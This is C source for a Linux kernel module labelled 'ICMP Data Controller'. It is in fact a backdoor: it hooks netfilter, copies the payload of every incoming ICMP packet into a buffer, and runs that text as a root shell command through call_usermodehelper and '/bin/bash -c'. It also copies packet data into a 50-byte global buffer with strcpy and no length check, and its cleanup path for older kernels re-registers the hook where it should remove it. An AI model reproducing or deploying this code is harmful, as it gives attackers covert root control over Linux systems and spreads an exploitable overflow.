#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/netfilter.h>
#include <linux/kmod.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <linux/udp.h>
#include <linux/icmp.h>
#include <linux/ip.h>
#include <linux/inet.h>
#include <linux/version.h>
#include <linux/kthread.h>
#include <linux/semaphore.h>
#define DIP "1.2.3.4"

static struct nf_hook_ops nfho;     // net filter hook option struct
struct sk_buff* sock_buff;          // socket buffer used in linux kernel
struct udphdr* udp_header;          // udp header struct (not used)
struct iphdr* ip_header;            // ip header struct
struct icmphdr* icmp_header;
struct net* n;			    // net struct
static struct task_struct *etx_thread;

struct semaphore can_execute;

int queue;

MODULE_DESCRIPTION("ICMP Data Controller");
MODULE_AUTHOR("Ben Kravets");
MODULE_LICENSE("GPL");

char * envp[] = { "HOME=/","PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };

char commando[50];

int thread_function(void *pv)
{
    while(!kthread_should_stop()) {
        down_interruptible(&can_execute);
        msleep(10);
        if (queue == 1) {  
            char * argv[] = { "/bin/bash", "-c", commando, NULL }; 
            queue = 0;
            printk("when commando lands: %s\n", commando);
            call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
            printk("good to go\n");
        }
        if(kthread_should_stop()){
        	return 0;
        }
    } 
    return 0;
}

void pkt_hex_dump(struct sk_buff *skb, int icmp_packet_len)
{
    size_t len;
    int hdrlen;
    int rowsize = 16;
    int l, linelen, remaining;
    int li = 0;
    uint8_t *data, ch; 
    char command[icmp_packet_len+1];
    ip_header = (struct iphdr*)skb_network_header(sock_buff);
    data = (uint8_t *) skb_transport_header(skb)+8; //Get to data by skipping network header +8 bytes (ICMP header length)
    hdrlen = ip_header->ihl*4;
    printk(KERN_INFO "transport_len:  %p\n", data);
    if (skb_is_nonlinear(skb)) {
        len = skb->data_len;
    } else {
        len = skb->len;
    }
    remaining = len;
    
    linelen = min(remaining, rowsize);
    linelen = icmp_packet_len;
    remaining -= rowsize;
    for (l = 0; l < icmp_packet_len; l++) {
        ch = data[l]; 
        command[l] = ch;
    }
    command[icmp_packet_len] = '\0';
    li += 10; 
    printk(KERN_CONT "\n");
    printk("command length: %lu\n", sizeof(command));
    printk("icmp_packet_len: %i\n", icmp_packet_len);
    printk("command is: %s\n", command);
    strcpy(commando, command);
    return;
}

unsigned int hook_func(void* priv, struct sk_buff* skb, const struct nf_hook_state* state)
{
	sock_buff = skb;
	ip_header = (struct iphdr*)skb_network_header(sock_buff); //grab network header using accessor
	int shim;
	if (!sock_buff) { return NF_DROP; }

	if (ip_header->protocol == IPPROTO_ICMP) { //icmp=1 udp=17 tcp=6
		shim = ntohs(ip_header->tot_len) - 4*(ip_header->ihl)-8;
		pkt_hex_dump(skb, shim);
		queue = 1;
		up(&can_execute);
	}
	return NF_ACCEPT;
}

int init_module()
{
	nfho.hook = hook_func;
	nfho.hooknum = 4; //NF_IP_PRE_ROUTING=0(capture ICMP Request.)  NF_IP_POST_ROUTING=4(capture ICMP reply.)
	nfho.pf = PF_INET;//IPV4 packets
	nfho.priority = NF_IP_PRI_FIRST;//set to highest priority over all other hook functions
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
	for_each_net(n) { nf_register_net_hook(&init_net, &nfho); } //register hook depending on version
#else
	nf_register_hook(&nfho);
#endif
	printk(KERN_INFO "---------------------------------------\n");
	printk(KERN_INFO "Loading dropicmp kernel module...\n");
	sema_init(&can_execute, 1);
	etx_thread = kthread_run(thread_function,NULL,"eTx Thread");
        if(etx_thread) {
            pr_info("Kthread Created Successfully...\n");
        } else {
            pr_err("Cannot create kthread\n");
             return 0;
        }
	return 0;
}

void cleanup_module()
{
	int ret;
	printk(KERN_INFO "Cleaning up dropicmp module.\n");
	up(&can_execute);
	ret = kthread_stop(etx_thread);
	if(!ret)
  	    printk(KERN_INFO "Thread stopped");
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
	for_each_net(n) { nf_unregister_net_hook(&init_net, &nfho); } //unregister hook depending on version
#else
	nf_register_hook(&nfho);
#endif
}
